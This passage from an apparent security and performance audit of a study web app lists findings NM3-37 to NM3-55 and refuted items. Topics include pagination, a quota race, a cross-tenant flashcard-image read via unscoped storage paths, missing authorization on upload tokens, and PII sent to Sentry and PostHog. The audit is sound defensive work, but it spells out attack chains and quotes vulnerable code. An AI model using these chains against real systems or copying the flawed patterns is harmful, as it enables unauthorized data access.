const reqLimit = await rateLimit(`ai-chat:${ip}`, 20, 60_000);
```

**Remediation**

Add a per-user limiter using rateLimitKey('ai-chat', request, userId) (used elsewhere in the repo) in addition to (or instead of) the IP key, so a single account can't burst by rotating X-Forwarded-For. Ensure getClientIp only trusts the proxy hop count you actually run.

---

### NM3-37 — learn/chats GET has no pagination — loads all user chats with message count in one query

- **Severity:** Low
- **Lens:** performance
- **Category:** Unbounded Query
- **Location:** `app/api/learn/chats/route.ts:21`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

GET /api/learn/chats fetches all NotebookChat rows for the user with no limit. A heavy user with 200+ chats gets them all loaded on every sidebar render. Each row includes contextPageIds, contextDocIds, contextNotebookIds arrays and a _count join. No pagination is offered.

**Evidence**

```
const chats = await db.notebookChat.findMany({
  where: { userId },
  orderBy: { updatedAt: 'desc' },
  select: { id, title, notebookId, contextPageIds, contextDocIds, contextNotebookIds, createdAt, updatedAt, notebook: {...}, _count: { select: { messages: true } } },
}); // No take:
```

**Remediation**

Add take: 50 (or a configurable limit) with cursor-based pagination. The sidebar shows a finite number of chats; loading all is unnecessary. Older chats can be fetched on scroll.

---

### NM3-38 — Concurrency quota bypass (TOCTOU) on AI path generation: check-then-act between checkUsageLimit and incrementUsage

- **Severity:** Low
- **Lens:** pentest-deep
- **Category:** A04:2021 Insecure Design / Business-logic quota bypass (race condition)
- **Location:** `app/api/learn/paths/route.ts:105`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

POST /api/learn/paths gates with `checkUsageLimit(userId, usageFeature)` at the top (line 105) and only calls `incrementUsage(userId, usageFeature)` at the very end (line 346), AFTER an expensive Stage-A AI call + a multi-statement DB transaction. `checkUsageLimit` reads the current count non-atomically and `incrementUsage` is a separate upsert, so N concurrent requests can all read `used < limit` before any increment lands and all proceed -> a FREE user (ai_study_plan limit 1) or a PRO user (ultra_path limit 3/month) can generate more AI paths than their meter allows in a single burst, driving extra Anthropic/Gemini COGS. Unlike the sibling regenerate route, this POST has NO per-route `rateLimit()` (verified: no rateLimit/rateLimitKey import or call in the file), so the only backstop is the global monthly token budget (checkTokenBudget) — which caps total spend but not the per-feature path count. This is the same under-count class flagged broadly as NM-L3 but is a concrete, attacker-triggerable concurrency window on the highest-COGS AI route. Bounded blast radius (a few extra generations per burst, capped by the token budget) keeps it Low.

**Evidence**

```
const usage = await checkUsageLimit(userId, usageFeature);
    if (!usage.allowed) { ... }            // read
    // ... Stage A AI call + db.$transaction(...) ...
    void generatePath(planId, { allowRefund: true });
    await incrementUsage(userId, usageFeature);   // write happens only at the end — large check->act gap, no rate limit, no atomic reserve
```

**Remediation**

Reserve the credit atomically before the expensive work: either move `incrementUsage` to immediately after the gate inside a conditional atomic update (`UPDATE usageRecord SET count = count + 1 WHERE count < limit RETURNING` semantics) and refund on failure (the refundUsage helper already exists), or add a per-user `rateLimit(rateLimitKey('path-create', request, userId), 1-2, 60_000)` at the top to bound concurrent bursts (mirroring the regenerate route). Prefer the atomic reserve-and-settle since checkUsageLimit/incrementUsage are inherently racy as written.

---

### NM3-39 — notebooks/[id]/chats GET has no pagination — loads all chats with their associated flashcard/quiz sets

- **Severity:** Low
- **Lens:** performance
- **Category:** Unbounded Query
- **Location:** `app/api/notebooks/[id]/chats/route.ts:25`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

Loads all chats in a notebook including their associated flashcardSets and quizSets inline. A notebook with 50 chats that each generated 2 flashcard sets and 1 quiz set = 150 extra rows loaded eagerly. No limit is applied.

**Evidence**

```
const chats = await db.notebookChat.findMany({
  where: { notebookId },
  orderBy: { updatedAt: 'desc' },
  select: {
    ...
    flashcardSets: { select: { id, title, createdAt } },
    quizSets: { select: { id, title, createdAt } },
  },
}); // No take:
```

**Remediation**

Add take: 50 and cursor pagination. For the flashcard/quiz sets side-loaded per chat, consider omitting them from the list and fetching them only when a chat is expanded.

---

### NM3-40 — Cross-tenant flashcard-image read via unscoped storagePath in image-registration route

- **Severity:** Low
- **Lens:** pentest-deep
- **Category:** A01:2021 Broken Access Control (IDOR / RLS-bypassing storage read)
- **Location:** `app/api/notebooks/[id]/flashcard-sets/[setId]/flashcards/[cardId]/images/route.ts:76`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

An authenticated user who owns flashcard card A can register a FlashcardImage on their OWN card that points at ANOTHER user's image blob, then read it back. Attack chain: (1) attacker POSTs to /api/notebooks/<own>/flashcard-sets/<own>/flashcards/<cardA>/images with body storagePath="flashcard-images/<victimCardId>/<victimFile>"; the prefix check `validateStoragePath(storagePath,'flashcard-images/')` passes because it only verifies the static top-level prefix, not `flashcard-images/<own cardId>/`; (2) the route downloads the blob (only for magic-byte validation here, but) creates a FlashcardImage row hanging off the attacker's card A; (3) attacker GETs /api/uploads/flashcard-images/<newImageId>, which is owner-scoped through `notebook:{userId}` and now resolves to the attacker's own card -> the victim's private flashcard image is served. The Supabase client uses the service-role key (bypasses RLS), so this app-layer prefix check is the only cross-tenant barrier. Severity is Low because exploitation requires knowing the victim's flashcard `cardId`, a high-entropy cuid that is not enumerable and is not exposed across tenants. This is the same storage-prefix-scoping class as the prior NM-H7 / the 2026-06-06 follow-up's temp-imports finding, but for a DISTINCT consumer route that appears in NEITHER the original audit's consumer list (sections/import, append-pdf, documents, learn/uploads, import/commit) NOR the follow-up's list (classify, import-xlsx, import-pptx, flashcard-sets/import).

**Evidence**

```
if (!storagePath || !validateStoragePath(storagePath, 'flashcard-images/')) {
      return badRequestResponse('Invalid or missing storagePath');
    }   // static prefix, not `flashcard-images/${cardId}/` — the signed-url route issues these paths as flashcard-images/<cardId>/<ts>-<file>, so any cardId's blob is accepted
```

**Remediation**

Scope the prefix to the caller's own card at the call site: `validateStoragePath(storagePath, \`flashcard-images/${cardId}/\`)`. The cardId is already validated as owned earlier in the handler (db.flashcard.findFirst with the notebook->userId chain), so binding the prefix to it closes the cross-tenant read. Apply the same scoping to the other still-static `temp-imports/` consumers (classify/import-xlsx/import-pptx/flashcard-sets/import) for consistency.

---

### NM3-41 — Group-avatar upload token issued with no group-membership authorization (object-level authz gap on the signed-URL boundary)

- **Severity:** Low
- **Lens:** architecture, code-review, security *(reported by 3 lenses)*
- **Category:** A01:2021 Broken Access Control (IDOR on token issuance)
- **Location:** `app/api/uploads/signed-url/route.ts:178`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

In the `group-avatar` case, the route mints a Supabase signed UPLOAD token for the PUBLIC bucket at the fully client-controlled, predictable path `avatars/group-<groupId>-<ts>.<ext>` after checking only that the caller is authenticated — it never verifies the caller is an owner/admin/teacher (or even a member) of `groupId`. This is inconsistent with the sibling `admin-background` case in the SAME switch (lines 271-289), which re-reads role from the DB, and with the actual avatar-set route (app/api/groups/[id]/avatar/route.ts:37-46), which requires an accepted owner/admin/teacher membership. An attacker who knows any groupId can write arbitrary image blobs into the shared public avatars/ namespace under another group's predictable key, and can overwrite a group's pending-avatar object between a legitimate admin's token issuance and PUT. The DB avatarUrl write is gated, so impact is bounded to public-bucket blob writes/clobbering rather than changing what a group displays — hence Low — but it is a clear trust-boundary inconsistency on the upload boundary.

**Evidence**

```
case 'group-avatar': {
        const { groupId } = body as SignedUrlRequestBody & { groupId: string };
        if (!groupId) { return badRequestResponse('group-avatar requires groupId'); }
        const ext = getExtensionFromContentType(contentType);
        storagePath = `avatars/group-${groupId}-${Date.now()}.${ext}`;
        bucket = BUCKET_PUBLIC;
        break;
      }  // <-- no studyGroupMember role/membership check, unlike admin-background and the avatar-set route
```

**Remediation**

Before issuing the token, look up `studyGroupMember.findUnique({ groupId_userId })` and require `status==='accepted'` and a role in ['owner','admin','teacher'] (mirror groups/[id]/avatar/route.ts). Apply the same per-resource authorization to every signed-URL purpose that targets a shared/cross-tenant namespace, so the upload boundary enforces the same ownership the consuming write enforces.

---

### NM3-42 — No self-serve data-access / portability export endpoint — DSARs are manual-email only

- **Severity:** Low
- **Lens:** privacy, compliance *(reported by 2 lenses)*
- **Category:** GDPR Art.15/Art.20 & CCPA Right to Know — access/portability fulfillment
- **Location:** `app/api/user/delete-account/route.ts:6`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

A code search for any data-export / portability / 'right to access' route returns nothing under either api tree; the only self-serve data-subject control implemented is account deletion. The Privacy Policy correctly enumerates the access/portability/rectification rights but routes all of them to a single email address (notemage.app@gmail.com). That is a legally acceptable fallback, but it means access (Art.15), portability in a machine-readable format (Art.20), and the CCPA 'Right to Know' are entirely manual, with no tested process to meet the 1-month (GDPR) / 45-day (CCPA) SLA and a real risk of inconsistent/incomplete fulfilment given how much data is spread across DB + Supabase Storage + processors.

**Evidence**

```
Grep for portab|export.*account|download.*data|exportUserData|right.to.access across the repo matches only privacy.en.md and an onboarding component — there is no /api route that assembles and returns a user's data. delete-account is the sole DSR endpoint.
```

**Remediation**

Add an authenticated 'export my data' endpoint that assembles the user's profile + content (and notes which data lives at processors) into a downloadable JSON/ZIP, mirroring the deletion flow's coverage. Document and rehearse the manual DSAR runbook (who responds, within what SLA, what sources) until automated.

---

### NM3-43 — Todos and Exams list endpoints have no pagination limit

- **Severity:** Low
- **Lens:** performance
- **Category:** Unbounded Query
- **Location:** `app/api/user/todos/route.ts:20`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

GET /api/user/todos and GET /api/user/exams fetch all rows for the user with no take limit. A user who creates hundreds of todos or exam entries gets them all loaded in one request. While unlikely to cause issues for most users in the near term, these endpoints have no defensive ceiling. The Prisma schema has @@index([userId, completed]) for todos and @@index([userId, examDate]) for exams, so the queries themselves are fast — but the response payload is unbounded.

**Evidence**

```
const todos = await db.todo.findMany({
  where: { userId },
  orderBy: { createdAt: 'desc' },
  // No take:
});

const exams = await db.exam.findMany({
  where: { userId, examDate: { gte: new Date() } },
  orderBy: { examDate: 'asc' },
  // No take:
});
```

**Remediation**

Add take: 100 or similar reasonable ceiling to both endpoints. Exams are already filtered to future dates, so the set is naturally small; todos could accumulate. Cursor pagination can be added later if needed.

---

### NM3-44 — Missing screen reader only utility class

- **Severity:** Low
- **Lens:** accessibility
- **Category:** Screen Reader & Assistive Technology
- **Location:** `app/globals.css:1`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

The project lacks a standard sr-only or visually-hidden utility class for visually hiding content while keeping it available to screen readers. This is useful for skip links, additional context, and form instructions that should be audible but not visible.

**Evidence**

```
No sr-only class definition found in globals.css; grep for 'sr-only' returns 0 results
```

**Remediation**

Add a standard sr-only utility class to globals.css: .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border-width: 0; }

---

### NM3-45 — Missing compound index on ChatMessage (userId, createdAt) for hot token-budget aggregation query

- **Severity:** Low *(verifier adjusted from High)*
- **Lens:** performance
- **Category:** Missing Database Index
- **Location:** `prisma/schema.prisma:426` *(verifier-corrected from prisma/schema.prisma:425)*
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06) — compound `(userId, createdAt)` index; migration `20260609000000_audit_indexes_and_auditlog_setnull`.

**Impact / attack scenario**

checkTokenBudget is called on every AI endpoint (chat messages, page generate, inline AI, essay check, document summarize, path generation, path translate, path regenerate). The query is db.chatMessage.aggregate({ where: { userId, createdAt: { gte: startOfMonth }, tokens: { not: null } }, _sum: { tokens: true } }). The schema only has @@index([userId]) and @@index([chatId]) — there is no compound (userId, createdAt) index. PostgreSQL uses the userId index but must then filter all the user's historical messages by createdAt and tokens != null in a sequential scan over potentially thousands of rows per active user per call. At 10+ AI requests per user session this is the highest-frequency expensive scan in the application.

**Evidence**

```
@@index([notebookId])
@@index([userId])
@@index([chatId])
@@map("chat_messages")

// Usage in token-budget.ts line 31:
const tokenUsage = await db.chatMessage.aggregate({
  where: { userId, createdAt: { gte: startOfMonth }, tokens: { not: null } },
  _sum: { tokens: true },
});
```

**Remediation**

Add @@index([userId, createdAt]) to ChatMessage in schema.prisma and generate a migration. Better still, use a UsageRecord-style denormalized token counter (increment on write, read in O(1)) rather than re-aggregating on every request. The current pattern issues one expensive aggregate query per AI request per user; a denormalized counter eliminates that entirely.

---

### NM3-46 — Sentry initialised with default PII capture and no scrubbing / no consent gate

- **Severity:** Low
- **Lens:** privacy
- **Category:** GDPR — error-monitoring processor receives PII without consent or minimization
- **Location:** `sentry.client.config.ts:3`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

All three Sentry configs init with `tracesSampleRate: 0.1` and no `beforeSend`, no `maskAllText`-style scrubbing, and no consent gate (unlike PostHog, which is correctly opt-out-by-default and consent-gated). Sentry @sentry/nextjs attaches request/URL context and can carry user identifiers and request data to a US processor regardless of the analytics-consent decision, with no documented DPA-aligned scrubbing. The client config also sets `replaysOnErrorSampleRate: 1.0` — this is currently inert because no `replayIntegration()` is registered (so no session replay is actually captured), but if a future change adds the replay integration it would silently start recording full screen sessions (potentially form input / note content) on every error with no masking and no consent. Sentry is also not listed as a processor in the Privacy Policy's processor table.

**Evidence**

```
Sentry.init({
  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
  tracesSampleRate: 0.1,
  replaysSessionSampleRate: 0,
  replaysOnErrorSampleRate: 1.0, // inert today (no replayIntegration), but a foot-gun
  environment: process.env.NODE_ENV,
});
// No beforeSend / data scrubbing; no replayIntegration() so replay does not fire yet.
```

**Remediation**

Add a `beforeSend`/`beforeSendTransaction` that strips PII and bodies, set `sendDefaultPii: false` explicitly, and drop or guard `replaysOnErrorSampleRate` until a masked, consent-gated replay is intentionally adopted (`maskAllText: true`, `blockAllMedia: true`). List Sentry (and its location) in the Privacy Policy processor table.

---

### NM3-47 — File input without visible label or aria-label

- **Severity:** Low *(verifier adjusted from High)*
- **Lens:** accessibility
- **Category:** Form Labels & Instructions
- **Location:** `src/components/learn/ChatThread.tsx:1360` *(verifier-corrected from src/components/learn/ChatThread.tsx:1386)*
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06)

**Impact / attack scenario**

Screen reader users cannot identify the purpose of the hidden file input. While the parent div has accessible text ('Drop or click to upload'), the input itself is hidden and unlabeled, making it impossible for assistive technology users to locate or interact with it independently.

**Evidence**

```
<input ref={fileInputRef} type="file" accept=".pdf,.docx,.txt,.md" style={{ display: 'none' }} onChange={...} /> - The input has no associated label, aria-label, or aria-describedby
```

**Remediation**

Add aria-label="Upload file" or aria-label="Upload PDF, DOCX, TXT, or MD file" to the input element, or associate it with a visible label element using htmlFor.

---

### NM3-48 — N+1 query in gatherUserStats: per-attempt DB round-trip for perfect-first-try achievement

- **Severity:** Low *(verifier adjusted from High)*
- **Lens:** performance
- **Category:** N+1 Query / Database Performance
- **Location:** `src/lib/achievement-checker.ts:210`
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

checkAndUnlockAchievements is called fire-and-forget on every quiz submission, notebook create, group create, exam create, and every chat message POST. gatherUserStats first fetches all 100%-score quiz attempts (one query), then for each such attempt fires a separate findFirst to check if any earlier attempt exists — up to N additional DB round-trips for a user with N perfect-score quizzes. A user with 20 perfect quizzes issues up to 21 sequential queries on every write action. Under moderate load this is the most expensive unbounded read in the hot path.

**Evidence**

```
const perfectAttempts = await db.quizAttempt.findMany({ where: { userId, percentage: 100 }, ... });
for (const pa of perfectAttempts) {
  const earlierAttempt = await db.quizAttempt.findFirst({ where: { userId, quizSetId: pa.quizSetId, createdAt: { lt: pa.createdAt } }, ... });
  if (!earlierAttempt) { hasPerfectFirstTry = true; break; }
}
```

**Remediation**

Replace the loop with a single raw SQL query: SELECT EXISTS (SELECT 1 FROM quiz_attempts a WHERE a.userId = $userId AND a.percentage = 100 AND NOT EXISTS (SELECT 1 FROM quiz_attempts b WHERE b.userId = a.userId AND b.quizSetId = a.quizSetId AND b.createdAt < a.createdAt)) AS ok. This collapses O(N) round-trips into one self-join query. Alternatively, denormalize the flag on the User row (like maxQuizStreakEver is already denormalized) and update it only when a new 100% attempt is recorded.

---

### NM3-49 — OneNote disconnect and account deletion do not revoke the OAuth grant at Microsoft (only delete the local encrypted token)

- **Severity:** Low
- **Lens:** privacy
- **Category:** GDPR — third-party processor data minimization / revocation accuracy vs disclosed policy
- **Location:** `src/lib/microsoftAuth.ts:251`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

`disconnectMicrosoft` (and, by cascade, account deletion) only runs `db.microsoftConnection.deleteMany(...)` — it deletes the locally stored AES-256-GCM-encrypted access/refresh tokens but never calls Microsoft's token-revocation/sign-out endpoint. The Privacy Policy tells users 'you can revoke it at any time' and that disconnecting 'deletes the stored Microsoft tokens'; while the local copy is deleted, the actual delegated grant at Microsoft remains valid until the refresh token naturally expires. The blast radius is limited (read-only delegated scope, tokens encrypted at rest with a dedicated key), so this is Low, but it is a mismatch between the user's expectation of 'revoke' and what happens.

**Evidence**

```
export async function disconnectMicrosoft(userId: string): Promise<void> {
  await db.microsoftConnection.deleteMany({ where: { userId: { equals: userId } } });
}
// No call to Microsoft's /oauth2/v2.0/logout or token revocation — the delegated grant persists at Microsoft.
```

**Remediation**

On disconnect/deletion, attempt to revoke the refresh token at Microsoft (acquire a token and call the revocation/sign-out endpoint) before deleting the local row; treat failure as non-fatal. Alternatively soften the policy wording to 'we delete our stored access tokens; you can also revoke Notemage's access from your Microsoft account security settings,' and link there.

---

### NM3-50 — The `starsForPercentage` and `isSlotUnlocked` functions — which gate assessment pass/fail and slot accessibility — have no direct unit tests

- **Severity:** Low
- **Lens:** qa
- **Category:** Test Coverage / Business Logic
- **Location:** `src/lib/path-gating.ts:202`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

Both functions are called by the assessment route (`app/api/learn/slots/[slotId]/assessment/route.ts`) to determine whether a slot can be submitted to and whether the quiz result passes. `starsForPercentage` maps percentage → stars (0/1/2/3) with thresholds at 70/85/95. `isSlotUnlocked` wraps `annotatePhases` and returns the unlock state for a specific slot. The `path-gating.test.ts` file tests `annotatePhases` for the pruned-vs-failed generation distinction but does not test `isSlotUnlocked` directly or any boundary value of `starsForPercentage`. A off-by-one error in threshold constants (e.g. changing `>= 70` to `> 70`) would not be caught by any existing test.

**Evidence**

```
`grep -n 'isSlotUnlocked' apps/web/src/lib/path-gating.test.ts` returns no output. `grep -n 'starsForPercentage' apps/web/src/lib/path-gating.test.ts` returns no output. `starsForPercentage` is defined at line 223, `isSlotUnlocked` at line 202 of `path-gating.ts`. The `path-gating.test.ts` imports only `annotatePhases` and `PhaseLite`/`SlotLite` types.
```

**Remediation**

Add to `path-gating.test.ts`: a `describe('starsForPercentage')` block with boundary tests at 69.99 (→0), 70.00 (→1), 84.99 (→1), 85.00 (→2), 94.99 (→2), 95.00 (→3), 100 (→3); and a `describe('isSlotUnlocked')` block with cases: slot found and unlocked → `{unlocked:true}`, slot found and locked (prerequisite incomplete) → `{unlocked:false, reason:'slot_locked'}`, slot not found → `{unlocked:false, reason:'slot_not_found'}`.

---

### NM3-51 — loadPathsForUser fetches full phase/slot/activity tree for every path with no pagination

- **Severity:** Low *(verifier adjusted from High)*
- **Lens:** performance
- **Category:** Unbounded Query / Over-fetching
- **Location:** `src/lib/path-loader.ts:83`
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

GET /api/learn/paths returns every StudyPlan the user owns, each with its full nested tree: phases → slots → activities, plus sharedPaths and notebook. A user with 5 paths, each with 5 phases × 5 slots × 3 activities = 375 activity rows plus all intermediate nodes — all loaded in one query and serialized. More paths compound the cost multiplicatively. This endpoint is called whenever the /learn page is visited. The full tree is needed to compute annotatePhases gating logic, but loading all paths without pagination means the response payload and DB fetch time grow unboundedly.

**Evidence**

```
export async function loadPathsForUser(userId: string): Promise<PlanWithTree[]> {
  return db.studyPlan.findMany({
    where: { userId },
    orderBy: { updatedAt: 'desc' },
    include: pathInclude,  // phases → slots → activities, sharedPaths, notebook
  });
}
```

**Remediation**

Paginate the paths list (e.g. take the 10 most-recently-updated by default) and load the full tree only for paths that are visible in the viewport. Alternatively, separate the list endpoint (return only plan-level fields + phase count + generationStatus) from the detail endpoint (return the full tree on demand per planId). The detail endpoint already exists at GET /api/learn/paths/[planId] and uses the same include — the list endpoint should use a slim select instead.

---

### NM3-52 — getUserUsageSummary issues a DB round-trip per lifetime-limited feature inside Promise.all

- **Severity:** Low
- **Lens:** performance
- **Category:** Excessive Database Queries
- **Location:** `src/lib/usage-limits.ts:109`
- **Confidence:** medium
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

getUserUsageSummary (called by GET /api/user/usage) maps over all tier feature entries and issues a separate db.usageRecord.aggregate query for each lifetime-limited feature inside the Promise.all. For a tier with 3 lifetime features this is 3 additional aggregate queries on top of the already-issued findMany for monthly records. This is a dashboard endpoint called on page load.

**Evidence**

```
return Promise.all(
  (Object.entries(limits) as [FeatureType, number][]).map(async ([feature, limit]) => {
    let used: number;
    if (isLifetimeLimit(tier, feature)) {
      const agg = await db.usageRecord.aggregate({
        where: { userId, featureType: feature },
        _sum: { count: true },
      });
      used = agg._sum.count ?? 0;
    } else {
      used = monthRecords.find((r) => r.featureType === feature)?.count ?? 0;
    }
    return { featureType: feature, used, limit };
  }),
);
```

**Remediation**

Replace per-feature aggregate calls with a single grouped query: db.usageRecord.groupBy({ by: ['featureType'], where: { userId }, _sum: { count: true } }). This collapses all feature lookups into one DB round-trip regardless of how many lifetime features exist.

---

## ⬜ Info

### NM3-53 — No test for the assessment route — client-trusted score/total forgery (the exact prior-pentest finding) has no regression guard

- **Severity:** Info *(verifier adjusted from High)*
- **Lens:** qa
- **Category:** Test Coverage / Grading Correctness
- **Location:** `app/api/learn/slots/[slotId]/assessment/route.ts:34`
- **Verification:** CONFIRMED
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06) — server now grades from the owned QuizAttempt (client sends `attemptId`, never a score/total).

**Impact / attack scenario**

The prior pentest (2026-06-06 finding 1) flagged this route for trusting `body.score`/`body.total` without re-grading server-side. The route now validates the range (`score >= 0 && score <= total && total > 0`) and re-computes `percentage` from those inputs — but the inputs are still entirely client-supplied. There is no test asserting: (a) that a forged `score=1000, total=1000` is accepted by range validation (it is — both valid numbers, score <= total) and yields 3 stars; (b) that `userId !== slot.phase.plan.userId` returns 404; (c) that a locked slot returns 403; (d) that `starsEarned` is clamped to the best-ever (never decremented). Without this test, any future change to the route or `starsForPercentage` can introduce a regression silently.

**Evidence**

```
`find apps/web/src -name '*.test.ts' | xargs grep -l 'assessment.*route|slotId.*assessment|starsEarned|starsForPercentage|score.*total.*percentage|body.score'` returns only `paths-clone.test.ts` and `path-gating.test.ts` which reference `assessment` only as a slot kind label — neither imports or calls the assessment route handler. The function `starsForPercentage` at `apps/web/src/lib/path-gating.ts:223` and `isSlotUnlocked` at `:202` also have zero direct test coverage.
```

**Remediation**

Write a test for `app/api/learn/slots/[slotId]/assessment/route.ts` (similar pattern to `paths-publish.test.ts`): mock `db`, `isSlotUnlocked`, `starsForPercentage`, assert: unauthenticated → 401; wrong owner → 404; locked slot → 403; valid 70% → 1 star, passed=true, activity marked complete; valid 60% → 0 stars, passed=false, activity NOT marked complete; star update only goes forward (re-submit with lower score → starsEarned unchanged). Also add unit tests for `starsForPercentage` boundary values (69.99 → 0, 70.00 → 1, 84.99 → 1, 85.00 → 2, 94.99 → 2, 95.00 → 3) and `isSlotUnlocked` (locked prerequisite → unlocked:false, completed prerequisite → unlocked:true).

---

### NM3-54 — Two divergent grading trust boundaries — server re-grades notebook quizzes but trusts the client for learn-path assessment slots

- **Severity:** Info
- **Lens:** architecture
- **Category:** A04:2021 Insecure Design (inconsistent trust boundary)
- **Location:** `app/api/notebooks/[id]/quiz-sets/[setId]/attempts/route.ts:121`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06) — assessment route now relies on the same server-graded attempt; grading is single-sourced.

**Impact / attack scenario**

Architecture-level observation (the concrete exploitable instance — the assessment route grading on body.score — is already tracked by the 2026-06-06 pentest and is NOT re-reported here). The notebook quiz-attempts route is the correct reference implementation: it ignores any client verdict and re-grades every answer server-side via grade(), and even re-executes code_write submissions through Piston and overrides the client-reported `passed` (lines 121-156). A structurally parallel grading endpoint for path checkpoints persists score/stars/completion from a client-supplied score/total with no server re-grade. Because there is no shared grading-submission contract or central 'never trust a client grade' invariant, the two paths drifted apart and gate progression/achievements on different trust assumptions. This is the design-level reason the divergence was able to ship undetected.

**Evidence**

```
// code_write: never trust the client-reported `passed`. Re-run the user's
// submitted code server-side against the question's declared tests and
// override the verdict.  ... answerRecords[i].isCorrect = allPassed;  (quiz-attempts route)
// vs. the assessment slot route persisting starsEarned/percentage from body.score/body.total
```

**Remediation**

Introduce a single server-side grading service that both the notebook-quiz and the path-assessment submission routes call; submissions should carry raw answers only (never a score/verdict). Add a design invariant + test that any endpoint writing score/stars/pass/completion derives them server-side. This closes the class, not just the one known instance.

---

### NM3-55 — PostHog identify transmits email and full name to the analytics processor

- **Severity:** Info
- **Lens:** privacy
- **Category:** GDPR — data minimization for product analytics
- **Location:** `src/components/analytics/PostHogIdentify.tsx:18`
- **Confidence:** high
- **Status:** ✅ FIXED (2026-06-06).

**Impact / attack scenario**

Once a user consents to analytics, `posthog.identify()` is called with `email`, `name`, `username`, `tier`, and `role` as person properties. This is consent-gated (opt-out by default, EU-hosted PostHog, session replay off — all good and disclosed), so it is not a violation. But product analytics rarely needs raw email + real name attached to every event stream; pushing direct identifiers to PostHog widens the PII footprint and the breach/erasure surface (PostHog persons must also be deleted on a DSAR — which the current deletion flow does not do). Flagging for minimization rather than as a defect.

**Evidence**

```
posthog.identify(session.user.id, {
  email: session.user.email ?? undefined,
  name: session.user.name ?? undefined,
  username: session.user.username,
  tier: session.user.tier,
  role: session.user.role,
});
```

**Remediation**

Send only what analytics needs (e.g. tier/role and the opaque user id); drop email/name, or gate them behind a separate justification. Add PostHog person-deletion to the account-deletion flow so erasure also clears the analytics profile.

---

## Appendix — Refuted findings (excluded)

These were reported as High by a lens but the adversarial verifier refuted them against the real code; not counted above and not marked in source.

### ~~api-auth-coverage test is a text-regex presence scan, not an object-level authorization test — cannot detect IDOR or cross-user scoping failures~~ (qa, originally High)

- **Claimed location:** `src/__tests__/api-auth-coverage.test.ts:26`
- **Verifier verdict:** REFUTED
- **Why refuted:** The finding's mechanical claims about the test are factually accurate, but its characterization (a "High" coverage-gap vulnerability) is wrong on purpose, scope, and severity.

WHAT IS TRUE: api-auth-coverage.test.ts:26 defines SESSION_AUTH as a name-presence regex (getAuthUserId|getAdminUserId|getServerSession|getToken), and line 69 only does SESSION_AUTH.test(src) — a static text search with no call-graph or data-flow analysis. I confirmed it cannot detect IDOR/scoping failures: both NM-H3 (app/api/user/activity-heatmap/route.ts) and NM-H4 (app/api/user/achievements/route.ts) now pass the regex solely because getAuthUserId appears, and would STILL pass even if their now-present profilePrivate/hideAchievements privacy gates were deleted. So the regex genuinely cannot catch the NM-H2/H3/H4-class IDORs.

WHY IT IS REFUTED AS FRAMED:
1) Mis-stated purpose. The test never claims to be an object-level authorization detector. Its header (lines 1-12) explicitly scopes it as the "NM-M1 guard": a defense-in-depth CI invariant that fires because the middleware does NOT blanket-gate /api/*, asserting every app/api/**/route.ts either calls an auth helper or is on a justified PUBLIC_ALLOWLIST. This is exactly what the prior audit's NM-M1 fix recommendation asked for (security-audit-2026-05-31.md line 154: "a CI test asserting every app/api/**/route.ts calls an auth helper"). The test does precisely its intended job.
2) It is not the only authz test. The repo has per-route BEHAVIORAL authorization tests that DO cover object-level concerns — e.g. src/__tests__/api/community/paths-detail.test.ts asserts 401 on missing session and 404 existence-leak guards on cross-user/pending resources; learn/paths-access.test.ts, community/paths-clone.test.ts, admin/tickets-action.test.ts contain 401/403/forbidden assertions. The regex test is one coarse layer in a multi-layer strategy, not the whole authz test surface.
3) Severity is indefensible. A perceived gap in test thoroughness is not an exploitable vulnerability — nothing in production is exploitable because of this test's design choice. At most this is an Info-level note that more object-level/IDOR behavioral tests would help (and some already exist).

Also checked the one concrete coverage worry: the test only scans app/api (API_DIR at line 21), not src/app/api. But src/app/api does not exist in this repo; all 185 route.ts files live under app/api, so discovery is complete and the >100 sanity assert (line 60) holds. No missed-directory gap.

File: apps/web/src/__tests__/api-auth-coverage.test.ts, line 26 (cited location is correct).

### ~~Unbounded chat message history loaded on every AI chat turn~~ (performance, originally High)

- **Claimed location:** `src/lib/chat-stream.ts:188`
- **Verifier verdict:** REFUTED
- **Why refuted:** The query at apps/web/src/lib/chat-stream.ts:188-192 does indeed load the full ChatMessage history for a chat with no take/LIMIT — that part is accurate. But the finding's core justification is factually wrong, and the High severity is unjustified.

WRONG CLAIM (the finding's central premise): The finding asserts the fetched history is "truncated... to the model's input window anyway because MAX_CONTEXT_CHARS is applied client-side" and is therefore "pure waste." This is false. MAX_CONTEXT_CHARS (anthropic.ts:33 = 400,000) is applied ONLY to the page/document context corpus (chat-stream.ts:142-156), NEVER to the conversation history. The full history is mapped into `conversationMessages` (lines 194-198) with no truncation and sent verbatim to both Anthropic (`messages: conversationMessages`, line 366) and Gemini (line 391). I grepped for any history pruning/slicing/deleteMany — none exists (the only "prune" hits are path-generation activities, unrelated). So every fetched message is actually USED by the model, not discarded. The finding's "fetching it all is pure waste" rationale collapses.

